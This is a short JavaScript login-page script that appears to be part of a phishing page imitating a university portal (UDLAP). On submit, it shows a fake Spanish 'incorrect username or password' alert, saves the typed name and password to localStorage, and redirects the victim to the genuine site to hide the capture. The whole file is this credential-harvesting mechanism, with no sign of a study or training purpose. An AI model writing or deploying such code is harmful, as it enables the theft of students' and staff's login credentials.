
const submitbtn = document.getElementById("submit");
const myName = document.getElementById("name");
const myPWD = document.getElementById("passwd");
const text = document.getElementById("filetype");
const forgetbtn = document.getElementById("forbtn")


submitbtn.onclick=function(){
    window.alert("Error 404: El nombre de usuario o la contraseña que escribió son incorrectos.  Inténtelo nuevamente. Si aún no puede iniciar sesión, comuníquese con el administrador del sistema.")
    localStorage.setItem("name", myName.value);
    localStorage.setItem("passwd", myPWD.value);
    window.location.assign("https://click.udlap.mx/")
}


